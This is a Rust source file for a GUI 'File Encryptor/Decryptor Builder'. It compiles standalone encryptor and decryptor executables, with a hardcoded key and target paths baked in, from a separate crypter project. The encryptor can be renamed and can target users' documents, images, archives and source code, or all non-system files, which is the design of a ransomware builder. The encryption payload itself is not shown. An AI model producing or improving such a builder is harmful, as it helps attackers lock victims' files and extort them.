use crate::models::{BuilderApp, LogEntry, PathEntry};
use chrono::Local;
use std::path::PathBuf;
use std::process::Command;
use std::fs;

impl BuilderApp {
	pub fn new() -> Self {
		Self {
			mode: "encrypt".to_string(),
			paths: Vec::new(),
			key_hex: String::new(),
			status: String::new(),
			new_path: String::new(),
			logs: Vec::new(),
			encrypt_exe_name: "encryptor.exe".to_string(),
			decrypt_exe_name: "decryptor.exe".to_string(),
			encrypt_only_target: true,
		}
	}

	fn add_log(&mut self, message: String, is_error: bool) {
		let timestamp = Local::now().format("%H:%M:%S").to_string();
		self.logs.push(LogEntry {
			timestamp,
			message,
			is_error,
		});
		if self.logs.len() > 100 {
			self.logs.remove(0);
		}
	}

	fn add_path(&mut self, path: String, is_file: bool) {
		if !path.is_empty() && !self.paths.iter().any(|p| p.path == path) {
			self.paths.push(PathEntry { path: path.clone(), is_file });
			self.add_log(format!("✅ Added path: {}", path), false);
		}
	}

	fn remove_path(&mut self, index: usize) {
		if index < self.paths.len() {
			let removed = self.paths.remove(index);
			self.add_log(format!("❌ Removed path: {}", removed.path), false);
		}
	}

	fn create_encryptor(&mut self) {
		if self.key_hex.len() != 64 {
			self.add_log("❌ Key must be 64 hex characters".to_string(), true);
			self.status = "❌ Invalid key length (must be 64 chars)".to_string();
			return;
		}

		if self.paths.is_empty() {
			self.add_log("❌ No paths added".to_string(), true);
			self.status = "❌ Please add at least one path".to_string();
			return;
		}

		self.compile_cryptor("encrypt".to_string(), self.encrypt_exe_name.clone());
	}

	fn create_decryptor(&mut self) {
		if self.key_hex.len() != 64 {
			self.add_log("❌ Key must be 64 hex characters".to_string(), true);
			self.status = "❌ Invalid key length (must be 64 chars)".to_string();
			return;
		}

		if self.paths.is_empty() {
			self.add_log("❌ No paths added".to_string(), true);
			self.status = "❌ Please add at least one path".to_string();
			return;
		}

		self.compile_cryptor("decrypt".to_string(), self.decrypt_exe_name.clone());
	}

	pub fn compile_cryptor(&mut self, mode: String, output_name: String) {
		// Подготавливаем пути для компиляции
		let paths_str = self.paths.iter().map(|p| p.path.clone()).collect::<Vec<_>>().join("|");

		// Проверяем наличие cargo
		let cargo_check = Command::new("cargo").arg("--version").output();
		if cargo_check.is_err() {
			self.add_log("❌ Cargo not found! Make sure Rust is installed".to_string(), true);
			self.status = "❌ Cargo not found. Please install Rust.".to_string();
			return;
		}

		self.add_log("🔨 Compiling, please wait...".to_string(), false);

		let encryptor_src = PathBuf::from("../crypter");

		let compile_result = Command::new("cargo")
			.arg("build")
			.arg("--release")
			.env("ENCRYPTION_KEY", &self.key_hex)
			.env("TARGET_PATHS", &paths_str)
			.env("OPERATION_MODE", &mode)
			.env("FILTER_ONLY_TARGET", self.encrypt_only_target.to_string())
			.current_dir(&encryptor_src)
			.status();

		match compile_result {
			Ok(status) if status.success() => {
				let built_exe = encryptor_src.join("target/release/crypter.exe");

				if !built_exe.exists() {
					self.add_log("❌ Compiled exe not found".to_string(), true);
					self.status = "❌ Compilation succeeded but exe missing".to_string();
					return;
				}

				let final_exe = PathBuf::from(&output_name);

				match fs::copy(&built_exe, &final_exe) {
					Ok(_) => {
						self.status = format!(
							"✅ {} created successfully!\n🔑 Key: {}\n📂 Paths: {}\n🎯 Mode: {}\n📁 Output: {}",
							output_name,
							self.key_hex,
							self.paths.len(),
							mode,
							final_exe.display()
						);
						self.add_log(format!("✅ Compiled {} successfully", output_name), false);
					}
					Err(e) => {
						self.status = format!("❌ Failed to copy exe: {}", e);
						self.add_log(format!("❌ Copy failed: {}", e), true);
					}
				}
			}
			Ok(status) => {
				self.status = "❌ Compilation failed".to_string();
				self.add_log("❌ Cargo build failed with non-zero exit code".to_string(), true);
			}
			Err(e) => {
				self.status = format!("❌ Failed to run cargo: {}", e);
				self.add_log(format!("❌ Cargo error: {}", e), true);
			}
		}
	}
}

impl eframe::App for BuilderApp {
	fn update(&mut self, ctx: &egui::Context, _frame: &mut eframe::Frame) {
		egui::CentralPanel::default().show(ctx, |ui| {
			ui.heading("🏗️ File Encryptor/Decryptor Builder v3.0");
			ui.label("Create standalone encryptors/decryptors with custom configs");
			ui.separator();

			// Две колонки
			egui::SidePanel::left("settings").default_width(400.0).show(ctx, |ui| {
				ui.add_space(10.0);

				// Настройки фильтрации
				ui.label("🎯 Encryption Filter:");
				ui.checkbox(&mut self.encrypt_only_target, "Only encrypt specific extensions (recommended)");
				if self.encrypt_only_target {
					ui.colored_label(egui::Color32::LIGHT_BLUE, "Will encrypt: documents, images, videos, archives, source code");
				} else {
					ui.colored_label(egui::Color32::LIGHT_YELLOW, "Will encrypt all files except system/executable");
				}

				ui.add_space(10.0);
				ui.separator();

				// Ключ
				ui.label("🔑 Encryption Key (64 hex characters):");
				ui.horizontal(|ui| {
					ui.text_edit_singleline(&mut self.key_hex);
					if ui.button("🎲 Random").clicked() {
						self.key_hex = (0..32)
							.map(|_| format!("{:02x}", rand::random::<u8>()))
							.collect();
						self.add_log("🎲 Generated new random key".to_string(), false);
					}
				});

				if !self.key_hex.is_empty() && self.key_hex.len() != 64 {
					ui.colored_label(egui::Color32::RED, format!("Length: {}/64", self.key_hex.len()));
				} else if self.key_hex.len() == 64 {
					ui.colored_label(egui::Color32::GREEN, "✓ Valid key");
				}

				ui.add_space(10.0);
				ui.separator();

				// Список путей
				ui.label("📁 Paths to process:");

				// Добавление нового пути
				ui.horizontal(|ui| {
					ui.text_edit_singleline(&mut self.new_path);
					if ui.button("📂 Add folder").clicked() {
						if !self.new_path.is_empty() {
							self.add_path(self.new_path.clone(), false);
							self.new_path.clear();
						}
					}
					if ui.button("📂 Add file").clicked() {
						if !self.new_path.is_empty() {
							self.add_path(self.new_path.clone(), true);
							self.new_path.clear();
						}
					}
				});

				ui.add_space(5.0);

				// Отображение списка путей
				if !self.paths.is_empty() {
					egui::Frame::group(ui.style()).show(ui, |ui| {
						egui::ScrollArea::vertical().id_source("paths_scroll_area").max_height(150.0).show(ui, |ui| {
							let paths_clone: Vec<PathEntry> = self.paths.clone();
							for entry in paths_clone.iter() {
								ui.horizontal(|ui| {
									let icon = if entry.is_file { "📄" } else { "📁" };
									ui.label(format!("{} {}", icon, entry.path));
									if ui.small_button("❌").clicked() {
										if let Some(original_index) = self.paths.iter().position(|p| p.path == entry.path) {
											self.remove_path(original_index);
										}
									}
								});
							}
						});
					});
				} else {
					ui.colored_label(egui::Color32::GRAY, "No paths added yet");
				}

				ui.add_space(10.0);
				ui.separator();

				// Создание encryptor и decryptor
				ui.label("🔧 Generate executables:");

				ui.horizontal(|ui| {
					ui.label("Encryptor name:");
					ui.text_edit_singleline(&mut self.encrypt_exe_name);
					if !self.encrypt_exe_name.ends_with(".exe") && !self.encrypt_exe_name.is_empty() {
						self.encrypt_exe_name.push_str(".exe");
					}
				});

				if ui.button("🔒 Create Encryptor").clicked() {
					self.create_encryptor();
				}

				ui.add_space(5.0);

				ui.horizontal(|ui| {
					ui.label("Decryptor name:");
					ui.text_edit_singleline(&mut self.decrypt_exe_name);
					if !self.decrypt_exe_name.ends_with(".exe") && !self.decrypt_exe_name.is_empty() {
						self.decrypt_exe_name.push_str(".exe");
					}
				});

				if ui.button("🔓 Create Decryptor").clicked() {
					self.create_decryptor();
				}

				ui.add_space(10.0);

				// Статус
				ui.separator();
				ui.label("📊 Status:");
				let status_text = &self.status;
				if status_text.starts_with("✅") {
					ui.colored_label(egui::Color32::LIGHT_GREEN, status_text);
				} else if status_text.starts_with("❌") {
					ui.colored_label(egui::Color32::LIGHT_RED, status_text);
				} else {
					ui.label(status_text);
				}
			});

			// Правая панель с логами
			egui::SidePanel::right("logs_panel").default_width(ui.available_width() - 400.0).show(ctx, |ui| {
				ui.heading("📋 Activity Log");
				ui.separator();

				egui::ScrollArea::vertical().id_source("logs_scroll_area")
					.max_height(ui.available_height() - 50.0)
					.stick_to_bottom(true)
					.show(ui, |ui| {
						let logs_clone: Vec<LogEntry> = self.logs.clone();
						for log in logs_clone.iter().rev() {
							if log.is_error {
								ui.colored_label(egui::Color32::LIGHT_RED,
								                 format!("[{}] {}", log.timestamp, log.message));
							} else {
								ui.colored_label(egui::Color32::LIGHT_GREEN,
								                 format!("[{}] {}", log.timestamp, log.message));
							}
						}

						if self.logs.is_empty() {
							ui.colored_label(egui::Color32::GRAY, "No activity yet");
						}
					});

				ui.add_space(5.0);
				if ui.button("🗑️ Clear Log").clicked() {
					self.logs.clear();
					self.add_log("Log cleared".to_string(), false);
				}
			});
		});
	}
}